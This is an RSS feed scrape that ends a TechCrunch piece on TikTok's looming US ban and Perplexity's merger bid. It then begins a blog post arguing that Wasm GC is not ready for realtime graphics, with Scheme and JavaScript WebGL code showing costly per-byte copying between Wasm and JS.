<p>Meanwhile, President-elect Donald Trump, who will be inaugurated on Monday, said he would <a rel="nofollow" href="https://www.nbcnews.com/politics/donald-trump/trump-likely-give-tiktok-90-day-extension-avoid-ban-rcna188258">“most likely” give TikTok a 90-day extension</a>, and TikTok’s CEO <a href="https://techcrunch.com/2025/01/17/tiktok-ceo-responds-to-trump-thanks-him-for-trying-to-solve-us-ban/">posted a video thanking Trump </a>for his efforts.</p>

<p>However, TikTok said that without more explicit assurances of non-enforcement from the Biden administration, <a href="https://techcrunch.com/2025/01/18/tiktok-says-it-will-go-dark-sunday-unless-biden-offers-definitive-statement/">it will be “forced to go dark”</a> on Sunday.</p>

<p>Despite a number of buyers expressing interest in TikTok, ByteDance has said repeatedly that it does not intend to sell. (The company described a report that <a href="https://techcrunch.com/2025/01/13/china-is-reportedly-open-to-elon-musk-acquiring-tiktok-us/">the Chinese government is open to an acquisition by Elon Musk</a> as “pure fiction.”) CNBC reports that Perplexity is hoping it can overcome those reservations by proposing a merger rather than a sale.</p>


<p>TechCrunch has reached out to TikTok and Perplexity AI for comment.</p>
</div>

			

			


			
			
			

			




			
			
			

			



			
<div>
	
	
	
	

	
<div>
	<p>Anthony Ha is TechCrunch’s weekend editor. Previously, he worked as a tech reporter at Adweek, a senior editor at VentureBeat, a local government reporter at the Hollister Free Lance, and vice president of content at a VC firm. He lives in New York City.	</p>
</div>


	
	<p>
		<a data-ctatext="View Bio" data-destinationlink="https://techcrunch.com/author/anthony-ha/" data-event="button" href="https://techcrunch.com/author/anthony-ha/">View Bio <svg style="width: 1em;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="var(--c-svg, currentColor)" d="M16.5 12 9 19.5l-1.05-1.05L14.4 12 7.95 5.55 9 4.5z"></path></svg></a>
	</p>
	
</div>


			


		</div>
		

		
		<div id="wp-block-techcrunch-most-popular-posts__heading">
<h2 id="h-most-popular">Most Popular</h2>

</div>
		
	</div><div>
		<div>
	<div>
		<div>
			<h3>Newsletters</h3>
			
		</div>
		<p>Subscribe for the industry’s biggest tech news</p>
	</div>
	<form method="POST" action="/">
		
	</form>
	
</div>


		
		<h2>Related</h2>
		

		
		
		

		
		<div>

<h2>Latest in Government &amp; Policy</h2>




</div>
		

	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[WASM GC isn't ready for realtime graphics (116 pts)]]></title>
            <link>https://dthompson.us/posts/wasm-gc-isnt-ready-for-realtime-graphics.html</link>
            <guid>42750781</guid>
            <pubDate>Sat, 18 Jan 2025 19:36:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dthompson.us/posts/wasm-gc-isnt-ready-for-realtime-graphics.html">https://dthompson.us/posts/wasm-gc-isnt-ready-for-realtime-graphics.html</a>, See on <a href="https://news.ycombinator.com/item?id=42750781">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Wasm GC is a wonderful thing that is now available in all major web
browsers since slowpoke Safari/WebKit finally shipped it in December.
It provides a hierarchy of heap allocated reference types and a set of
instructions to operate on them.  Wasm GC enables managed memory
languages to take advantage of the advanced garbage collectors inside
web browser engines.  It’s now possible to implement a managed memory
language without having to ship a GC inside the binary.  The benefits
are smaller binaries, better performance, and better integration with
the host runtime.</p><p>However, Wasm GC has some serious drawbacks when compared to linear
memory. I enjoy playing around with realtime graphics programming in
my free time, but I was disappointed to discover that Wasm GC just
isn’t a good fit for that right now.  I decided to write this post
because I’d like to see Wasm GC on more or less equal footing with
linear memory when it comes to binary data manipulation.</p><h2>Hello triangle</h2><p>For starters, let's take a look at what a <a href="https://learnopengl.com/Getting-started/Hello-Triangle">“hello
triangle”</a>
WebGL demo looks like with Wasm GC.  I’ll use
<a href="https://spritely.institute/hoot">Hoot</a>, the Scheme to Wasm compiler
that I work on, to build it.</p><p>Below is a Scheme program that declares imports for the subset of the
WebGL, HTML5 Canvas, etc. APIs that are necessary and then renders a
single triangle:</p><pre><code><span>(</span><span>use-modules</span> <span>(</span><span>hoot</span> <span>ffi</span><span>)</span><span>)</span>

<span>;; Document
</span><span>(</span><span>define-foreign</span> <span>get-element-by-id</span>
  <span>"document"</span> <span>"getElementById"</span>
  <span>(</span><span>ref</span> <span>string</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>null</span> <span>extern</span><span>)</span><span>)</span>

<span>;; Element
</span><span>(</span><span>define-foreign</span> <span>element-width</span>
  <span>"element"</span> <span>"width"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>i32</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>element-height</span>
  <span>"element"</span> <span>"height"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>i32</span><span>)</span>

<span>;; Canvas
</span><span>(</span><span>define-foreign</span> <span>get-canvas-context</span>
  <span>"canvas"</span> <span>"getContext"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>string</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>null</span> <span>extern</span><span>)</span><span>)</span>

<span>;; WebGL
</span><span>(</span><span>define</span> <span>GL_VERTEX_SHADER</span> <span>35633</span><span>)</span>
<span>(</span><span>define</span> <span>GL_FRAGMENT_SHADER</span> <span>35632</span><span>)</span>
<span>(</span><span>define</span> <span>GL_COMPILE_STATUS</span> <span>35713</span><span>)</span>
<span>(</span><span>define</span> <span>GL_LINK_STATUS</span> <span>35714</span><span>)</span>
<span>(</span><span>define</span> <span>GL_ARRAY_BUFFER</span> <span>34962</span><span>)</span>
<span>(</span><span>define</span> <span>GL_STATIC_DRAW</span> <span>35044</span><span>)</span>
<span>(</span><span>define</span> <span>GL_COLOR_BUFFER_BIT</span> <span>16384</span><span>)</span>
<span>(</span><span>define</span> <span>GL_TRIANGLES</span> <span>4</span><span>)</span>
<span>(</span><span>define</span> <span>GL_FLOAT</span> <span>5126</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-create-shader</span>
  <span>"gl"</span> <span>"createShader"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-delete-shader</span>
  <span>"gl"</span> <span>"deleteShader"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-shader-source</span>
  <span>"gl"</span> <span>"shaderSource"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>string</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-compile-shader</span>
  <span>"gl"</span> <span>"compileShader"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-get-shader-parameter</span>
  <span>"gl"</span> <span>"getShaderParameter"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>-&gt;</span> <span>i32</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-get-shader-info-log</span>
  <span>"gl"</span> <span>"getShaderInfoLog"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>string</span><span>)</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-create-program</span>
  <span>"gl"</span> <span>"createProgram"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-delete-program</span>
  <span>"gl"</span> <span>"deleteProgram"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-attach-shader</span>
  <span>"gl"</span> <span>"attachShader"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-link-program</span>
  <span>"gl"</span> <span>"linkProgram"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-use-program</span>
  <span>"gl"</span> <span>"useProgram"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-get-program-parameter</span>
  <span>"gl"</span> <span>"getProgramParameter"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>-&gt;</span> <span>i32</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-get-program-info-log</span>
  <span>"gl"</span> <span>"getProgramInfoLog"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>string</span><span>)</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-create-buffer</span>
  <span>"gl"</span> <span>"createBuffer"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-delete-buffer</span>
  <span>"gl"</span> <span>"deleteBuffer"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-bind-buffer</span>
  <span>"gl"</span> <span>"bindBuffer"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-buffer-data</span>
  <span>"gl"</span> <span>"bufferData"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>(</span><span>ref</span> <span>eq</span><span>)</span> <span>i32</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-enable-vertex-attrib-array</span>
  <span>"gl"</span> <span>"enableVertexAttribArray"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-vertex-attrib-pointer</span>
  <span>"gl"</span> <span>"vertexAttribPointer"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-draw-arrays</span>
  <span>"gl"</span> <span>"drawArrays"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-viewport</span>
  <span>"gl"</span> <span>"viewport"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>i32</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-clear-color</span>
  <span>"gl"</span> <span>"clearColor"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>f64</span> <span>f64</span> <span>f64</span> <span>f64</span> <span>-&gt;</span> <span>none</span><span>)</span>
<span>(</span><span>define-foreign</span> <span>gl-clear</span>
  <span>"gl"</span> <span>"clear"</span>
  <span>(</span><span>ref</span> <span>extern</span><span>)</span> <span>i32</span> <span>-&gt;</span> <span>none</span><span>)</span>

<span>(</span><span>define</span> <span>(</span><span>compile-shader</span> <span>gl</span> <span>type</span> <span>source</span><span>)</span>
  <span>(</span><span>let</span> <span>(</span><span>(</span><span>shader</span> <span>(</span><span>gl-create-shader</span> <span>gl</span> <span>type</span><span>)</span><span>)</span><span>)</span>
    <span>(</span><span>gl-shader-source</span> <span>gl</span> <span>shader</span> <span>source</span><span>)</span>
    <span>(</span><span>gl-compile-shader</span> <span>gl</span> <span>shader</span><span>)</span>
    <span>(</span><span>unless</span> <span>(</span><span>=</span> <span>(</span><span>gl-get-shader-parameter</span> <span>gl</span> <span>shader</span> <span>GL_COMPILE_STATUS</span><span>)</span> <span>1</span><span>)</span>
      <span>(</span><span>let</span> <span>(</span><span>(</span><span>info</span> <span>(</span><span>gl-get-shader-info-log</span> <span>gl</span> <span>shader</span><span>)</span><span>)</span><span>)</span>
        <span>(</span><span>gl-delete-shader</span> <span>gl</span> <span>shader</span><span>)</span>
        <span>(</span><span>error</span> <span>"shader compilation failed"</span> <span>info</span><span>)</span><span>)</span><span>)</span>
    <span>shader</span><span>)</span><span>)</span>

<span>(</span><span>define</span> <span>(</span><span>link-shader</span> <span>gl</span> <span>vertex-shader</span> <span>fragment-shader</span><span>)</span>
  <span>(</span><span>let</span> <span>(</span><span>(</span><span>program</span> <span>(</span><span>gl-create-program</span> <span>gl</span><span>)</span><span>)</span><span>)</span>
    <span>(</span><span>gl-attach-shader</span> <span>gl</span> <span>program</span> <span>vertex-shader</span><span>)</span>
    <span>(</span><span>gl-attach-shader</span> <span>gl</span> <span>program</span> <span>fragment-shader</span><span>)</span>
    <span>(</span><span>gl-link-program</span> <span>gl</span> <span>program</span><span>)</span>
    <span>(</span><span>unless</span> <span>(</span><span>=</span> <span>(</span><span>gl-get-program-parameter</span> <span>gl</span> <span>program</span> <span>GL_LINK_STATUS</span><span>)</span> <span>1</span><span>)</span>
      <span>(</span><span>let</span> <span>(</span><span>(</span><span>info</span> <span>(</span><span>gl-get-program-info-log</span> <span>gl</span> <span>program</span><span>)</span><span>)</span><span>)</span>
        <span>(</span><span>gl-delete-program</span> <span>gl</span> <span>program</span><span>)</span>
        <span>(</span><span>error</span> <span>"program linking failed"</span> <span>info</span><span>)</span><span>)</span><span>)</span>
    <span>program</span><span>)</span><span>)</span>

<span>;; Setup GL context
</span><span>(</span><span>define</span> <span>canvas</span> <span>(</span><span>get-element-by-id</span> <span>"canvas"</span><span>)</span><span>)</span>
<span>(</span><span>define</span> <span>gl</span> <span>(</span><span>get-canvas-context</span> <span>canvas</span> <span>"webgl"</span><span>)</span><span>)</span>
<span>(</span><span>when</span> <span>(</span><span>external-null?</span> <span>gl</span><span>)</span>
  <span>(</span><span>error</span> <span>"unable to create WebGL context"</span><span>)</span><span>)</span>

<span>;; Compile shader
</span><span>(</span><span>define</span> <span>vertex-shader-source</span>
  <span>"attribute vec2 position;
attribute vec3 color;
varying vec3 fragColor;

void main() {
  gl_Position = vec4(position, 0.0, 1.0);
  fragColor = color;
}"</span><span>)</span>
<span>(</span><span>define</span> <span>fragment-shader-source</span>
  <span>"precision mediump float;

varying vec3 fragColor;

void main() {
  gl_FragColor = vec4(fragColor, 1);
}"</span><span>)</span>
<span>(</span><span>define</span> <span>vertex-shader</span>
  <span>(</span><span>compile-shader</span> <span>gl</span> <span>GL_VERTEX_SHADER</span> <span>vertex-shader-source</span><span>)</span><span>)</span>
<span>(</span><span>define</span> <span>fragment-shader</span>
  <span>(</span><span>compile-shader</span> <span>gl</span> <span>GL_FRAGMENT_SHADER</span> <span>fragment-shader-source</span><span>)</span><span>)</span>
<span>(</span><span>define</span> <span>shader</span> <span>(</span><span>link-shader</span> <span>gl</span> <span>vertex-shader</span> <span>fragment-shader</span><span>)</span><span>)</span>

<span>;; Create vertex buffer
</span><span>(</span><span>define</span> <span>stride</span> <span>(</span><span>*</span> <span>4</span> <span>5</span><span>)</span><span>)</span>
<span>(</span><span>define</span> <span>buffer</span> <span>(</span><span>gl-create-buffer</span> <span>gl</span><span>)</span><span>)</span>
<span>(</span><span>gl-bind-buffer</span> <span>gl</span> <span>GL_ARRAY_BUFFER</span> <span>buffer</span><span>)</span>
<span>(</span><span>gl-buffer-data</span> <span>gl</span> <span>GL_ARRAY_BUFFER</span>
                <span>#f32</span><span>(</span><span>-1.0</span> <span>-1.0</span>
                      <span>1.0</span>  <span>0.0</span>  <span>0.0</span>
                      <span>1.0</span> <span>-1.0</span>
                      <span>0.0</span>  <span>1.0</span>  <span>0.0</span>
                      <span>0.0</span>  <span>1.0</span>
                      <span>0.0</span>  <span>0.0</span>  <span>1.0</span><span>)</span>
                <span>GL_STATIC_DRAW</span><span>)</span>

<span>;; Draw
</span><span>(</span><span>gl-viewport</span> <span>gl</span> <span>0</span> <span>0</span> <span>(</span><span>element-width</span> <span>canvas</span><span>)</span> <span>(</span><span>element-height</span> <span>canvas</span><span>)</span><span>)</span>
<span>(</span><span>gl-clear</span> <span>gl</span> <span>GL_COLOR_BUFFER_BIT</span><span>)</span>
<span>(</span><span>gl-use-program</span> <span>gl</span> <span>shader</span><span>)</span>
<span>(</span><span>gl-enable-vertex-attrib-array</span> <span>gl</span> <span>0</span><span>)</span>
<span>(</span><span>gl-vertex-attrib-pointer</span> <span>gl</span> <span>0</span> <span>2</span> <span>GL_FLOAT</span> <span>0</span> <span>stride</span> <span>0</span><span>)</span>
<span>(</span><span>gl-enable-vertex-attrib-array</span> <span>gl</span> <span>1</span><span>)</span>
<span>(</span><span>gl-vertex-attrib-pointer</span> <span>gl</span> <span>1</span> <span>3</span> <span>GL_FLOAT</span> <span>0</span> <span>stride</span> <span>8</span><span>)</span>
<span>(</span><span>gl-draw-arrays</span> <span>gl</span> <span>GL_TRIANGLES</span> <span>0</span> <span>3</span><span>)</span></code></pre><p>Note that in Scheme, the equivalent of a <code>Uint8Array</code> is a
<em>bytevector</em>.  Hoot uses a packed array, an <code>(array i8)</code> specifically,
for the contents of a bytevector.</p><p>And here is the JavaScript code necessary to boot the resulting Wasm
binary:</p><pre><code><span>window</span><span>.</span><span>addEventListener</span><span>(</span><span>"load"</span><span>,</span> <span>async</span> <span>(</span><span>)</span> <span>=</span><span>&gt;</span> <span>{</span>
  <span>function</span> <span>bytevectorToUint8Array</span><span>(</span><span>bv</span><span>)</span> <span>{</span>
    <span>let</span> <span>len</span> <span>=</span> <span>reflect</span><span>.</span><span>bytevector_length</span><span>(</span><span>bv</span><span>)</span><span>;</span>
    <span>let</span> <span>array</span> <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>len</span><span>)</span><span>;</span>
    <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>len</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
      <span>array</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>reflect</span><span>.</span><span>bytevector_ref</span><span>(</span><span>bv</span><span>,</span> <span>i</span><span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> <span>array</span><span>;</span>
  <span>}</span>

  <span>let</span> <span>mod</span> <span>=</span> <span>await</span> <span>SchemeModule</span><span>.</span><span>fetch_and_instantiate</span><span>(</span><span>"triangle.wasm"</span><span>,</span> <span>{</span>
    <span>reflect_wasm_dir</span><span>:</span> <span>'reflect-wasm'</span><span>,</span>
    <span>user_imports</span><span>:</span> <span>{</span>
      <span>document</span><span>:</span> <span>{</span>
        <span>getElementById</span><span>:</span> <span>(</span><span>id</span><span>)</span> <span>=</span><span>&gt;</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>id</span><span>)</span>
      <span>}</span><span>,</span>
      <span>element</span><span>:</span> <span>{</span>
        <span>width</span><span>:</span> <span>(</span><span>elem</span><span>)</span> <span>=</span><span>&gt;</span> <span>elem</span><span>.</span><span>width</span><span>,</span>
        <span>height</span><span>:</span> <span>(</span><span>elem</span><span>)</span> <span>=</span><span>&gt;</span> <span>elem</span><span>.</span><span>height</span>
      <span>}</span><span>,</span>
      <span>canvas</span><span>:</span> <span>{</span>
        <span>getContext</span><span>:</span> <span>(</span><span>elem</span><span>,</span> <span>type</span><span>)</span> <span>=</span><span>&gt;</span> <span>elem</span><span>.</span><span>getContext</span><span>(</span><span>type</span><span>)</span>
      <span>}</span><span>,</span>
      <span>gl</span><span>:</span> <span>{</span>
        <span>createShader</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>type</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>createShader</span><span>(</span><span>type</span><span>)</span><span>,</span>
        <span>deleteShader</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>shader</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>deleteShader</span><span>(</span><span>shader</span><span>)</span><span>,</span>
        <span>shaderSource</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>shader</span><span>,</span> <span>source</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>shaderSource</span><span>(</span><span>shader</span><span>,</span> <span>source</span><span>)</span><span>,</span>
        <span>compileShader</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>shader</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>compileShader</span><span>(</span><span>shader</span><span>)</span><span>,</span>
        <span>getShaderParameter</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>shader</span><span>,</span> <span>param</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>getShaderParameter</span><span>(</span><span>shader</span><span>,</span> <span>param</span><span>)</span><span>,</span>
        <span>getShaderInfoLog</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>shader</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>getShaderInfoLog</span><span>(</span><span>shader</span><span>)</span><span>,</span>
        <span>createProgram</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>type</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>createProgram</span><span>(</span><span>type</span><span>)</span><span>,</span>
        <span>deleteProgram</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>program</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>deleteProgram</span><span>(</span><span>program</span><span>)</span><span>,</span>
        <span>attachShader</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>program</span><span>,</span> <span>shader</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>attachShader</span><span>(</span><span>program</span><span>,</span> <span>shader</span><span>)</span><span>,</span>
        <span>linkProgram</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>program</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>linkProgram</span><span>(</span><span>program</span><span>)</span><span>,</span>
        <span>useProgram</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>program</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>useProgram</span><span>(</span><span>program</span><span>)</span><span>,</span>
        <span>getProgramParameter</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>program</span><span>,</span> <span>param</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>getProgramParameter</span><span>(</span><span>program</span><span>,</span> <span>param</span><span>)</span><span>,</span>
        <span>getProgramInfoLog</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>program</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>getProgramInfoLog</span><span>(</span><span>program</span><span>)</span><span>,</span>
        <span>createBuffer</span><span>:</span> <span>(</span><span>gl</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>createBuffer</span><span>(</span><span>)</span><span>,</span>
        <span>deleteBuffer</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>buffer</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>deleteBuffer</span><span>(</span><span>buffer</span><span>)</span><span>,</span>
        <span>bindBuffer</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>target</span><span>,</span> <span>buffer</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>bindBuffer</span><span>(</span><span>target</span><span>,</span> <span>buffer</span><span>)</span><span>,</span>
        <span>bufferData</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>buffer</span><span>,</span> <span>data</span><span>,</span> <span>usage</span><span>)</span> <span>=</span><span>&gt;</span> <span>{</span>
          <span>let</span> <span>bv</span> <span>=</span> <span>new</span> <span>Bytevector</span><span>(</span><span>reflect</span><span>,</span> <span>data</span><span>)</span><span>;</span>
          <span>gl</span><span>.</span><span>bufferData</span><span>(</span><span>buffer</span><span>,</span> <span>bytevectorToUint8Array</span><span>(</span><span>bv</span><span>)</span><span>,</span> <span>usage</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
        <span>enableVertexAttribArray</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>index</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>enableVertexAttribArray</span><span>(</span><span>index</span><span>)</span><span>,</span>
        <span>vertexAttribPointer</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>index</span><span>,</span> <span>size</span><span>,</span> <span>type</span><span>,</span> <span>normalized</span><span>,</span> <span>stride</span><span>,</span> <span>offset</span><span>)</span> <span>=</span><span>&gt;</span> <span>{</span>
          <span>gl</span><span>.</span><span>vertexAttribPointer</span><span>(</span><span>index</span><span>,</span> <span>size</span><span>,</span> <span>type</span><span>,</span> <span>normalized</span><span>,</span> <span>stride</span><span>,</span> <span>offset</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
        <span>drawArrays</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>mode</span><span>,</span> <span>first</span><span>,</span> <span>count</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>drawArrays</span><span>(</span><span>mode</span><span>,</span> <span>first</span><span>,</span> <span>count</span><span>)</span><span>,</span>
        <span>viewport</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>x</span><span>,</span> <span>y</span><span>,</span> <span>w</span><span>,</span> <span>h</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>viewport</span><span>(</span><span>x</span><span>,</span> <span>y</span><span>,</span> <span>w</span><span>,</span> <span>h</span><span>)</span><span>,</span>
        <span>clearColor</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>r</span><span>,</span> <span>g</span><span>,</span> <span>b</span><span>,</span> <span>a</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>clearColor</span><span>(</span><span>r</span><span>,</span> <span>g</span><span>,</span> <span>b</span><span>,</span> <span>a</span><span>)</span><span>,</span>
        <span>clear</span><span>:</span> <span>(</span><span>gl</span><span>,</span> <span>mask</span><span>)</span> <span>=</span><span>&gt;</span> <span>gl</span><span>.</span><span>clear</span><span>(</span><span>mask</span><span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span><span>)</span><span>;</span>
  <span>let</span> <span>reflect</span> <span>=</span> <span>await</span> <span>mod</span><span>.</span><span>reflect</span><span>(</span><span>{</span> <span>reflect_wasm_dir</span><span>:</span> <span>'reflect-wasm'</span> <span>}</span><span>)</span><span>;</span>
  <span>let</span> <span>proc</span> <span>=</span> <span>new</span> <span>Procedure</span><span>(</span><span>reflect</span><span>,</span> <span>mod</span><span>.</span><span>get_export</span><span>(</span><span>"$load"</span><span>)</span><span>.</span><span>value</span><span>)</span><span>;</span>
  <span>proc</span><span>.</span><span>call</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span></code></pre><h2>Hello problems</h2><p>There are two major performance issues with this program.  One is
visible in the source above, the other is hidden in the language
implementation.</p><h3>Heap objects are opaque on the other side</h3><p>Wasm GC heap objects are <em>opaque</em> to the host.  Likewise, heap objects
from the host are opaque to the Wasm guest.  Thus the contents of an
<code>(array i8)</code> object are not visible from JavaScript and the contents
of a <code>Uint8Array</code> are not visible from Wasm.  This is a good security
property in the general case, but it’s a hinderance in this specific
case.</p><p>Let’s say we have an <code>(array i8)</code> full of vertex data we want to put
into a WebGL buffer.  To do this, we must make one JS-&gt;Wasm call <em>for
each byte</em> in the array and store it into a <code>Uint8Array</code>.  This is
what the <code>bytevectorToUint8Array</code> function above is doing.  Copying
any significant amount of data per frame is going to tank performance.
Hope you aren’t trying to stream vertex data!</p><p>Contrast the previous paragraph with Wasm linear memory.  A
<code>WebAssembly.Memory</code> object can be <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Memory/buffer">easily accessed from
JavaScript</a>
as an <code>ArrayBuffer</code>.  To get a blob of vertex data out of a memory
object, you just need to know the byte offset and length and you’re
good to go.  There are many Wasm linear memory applications using
WebGL successfully.</p><h3>Manipulating multi-byte binary data is inefficient</h3><p>To read a multi-byte number such as an unsigned 32-bit integer from an
<code>(array i8)</code>, you have to fetch each individual byte and combine them
together.  Here’s a self-contained example that uses Guile-flavored
